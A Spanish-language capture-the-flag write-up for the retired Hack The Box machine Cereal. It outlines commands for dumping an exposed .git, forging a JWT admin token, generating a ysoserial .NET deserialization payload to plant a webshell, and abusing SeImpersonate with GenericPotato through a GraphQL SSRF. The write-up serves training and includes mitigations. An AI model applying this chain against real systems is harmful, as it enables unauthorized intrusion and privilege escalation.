---
machine: Cereal
os: Windows
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [windows, web, jwt, deserialization, seimpersonate, graphql]
---

# Cereal — Hack The Box (Windows)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

Un `.git` expuesto revela el secreto JWT y permite forjar un token de administrador. El formulario autenticado encadena XSS con deserialización .NET para subir un webshell; el usuario tiene `SeImpersonate` y un GraphQL local con SSRF permite explotarlo con GenericPotato para llegar a SYSTEM.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,80,5985 <IP>
```

- Puertos: `22/tcp` SSH, `80/tcp` HTTP y `5985/tcp` WinRM.
- Servicios: Aplicación C#/.NET con frontend React, repositorio Git expuesto y backend GraphQL.
- Tecnologías: .NET, React, JWT, YSoSerial.NET, SeImpersonate y GraphQL.

## Enumeración

- `cereal.htb` con una aplicación de peticiones de sabores.
- `.git` accesible en la raíz web.
- Código de autenticación JWT y formulario de administración.
- GraphQL escuchando en localhost.

## Foothold

Se vuelca el repositorio, se localiza la clave JWT y se firma un token con el rol administrador. El formulario vulnerable refleja HTML y procesa objetos .NET; se encadena XSS con un payload de YSoSerial para escribir un webshell.

```bash
git-dumper http://cereal.htb/.git src
grep -RniE "jwt|secret|key" src
jwt_tool <TOKEN> -S hs256 -p "<SECRET>"
ysoserial.exe -g TypeConfuseDelegate -f ObjectStateFormatter -o payload.txt
# Enviar el payload por el campo vulnerable y visitar el webshell.
```

## Movimiento lateral

La shell inicial permite leer la contraseña del primer usuario y entrar por SSH; el movimiento siguiente es al servicio GraphQL local.

## Escalada de privilegios

`whoami /priv` muestra `SeImpersonateEnabled`. GenericPotato crea un servidor HTTP falso y se invoca a través del SSRF de GraphQL para capturar el token de SYSTEM e impersonarlo.

```bash
whoami /priv
GenericPotato.exe -l 8080 -p 80 -e "C:\\Windows\\Temp\\shell.exe"
# Disparar el SSRF de GraphQL hacia 127.0.0.1:8080
```

## Evidencia

- `.git` expuesto y secreto JWT en el código.
- Token de administrador aceptado por la aplicación.
- `SeImpersonate` y shell como SYSTEM.

## Lecciones aprendidas

- Un repositorio expuesto filtra tanto código como secretos de firma.
- La deserialización .NET permite ejecución si el tipo está controlado.
- `SeImpersonate` necesita un servicio local que autentique para explotarse.

## Mitigación y detección

- No publicar `.git` y rotar el secreto JWT.
- Evitar deserialización de tipos no confiables y usar listas blancas.
- Quitar `SeImpersonate` a cuentas de servicio y restringir GraphQL a localhost.

## Referencias

- [0xdf — Cereal](https://0xdf.gitlab.io/2021/05/29/htb-cereal.html)
- [IppSec — Cereal](https://www.youtube.com/watch?v=04ZBIioD5pA)
- [Hack The Box — Cereal](https://app.hackthebox.com/machines/cereal)
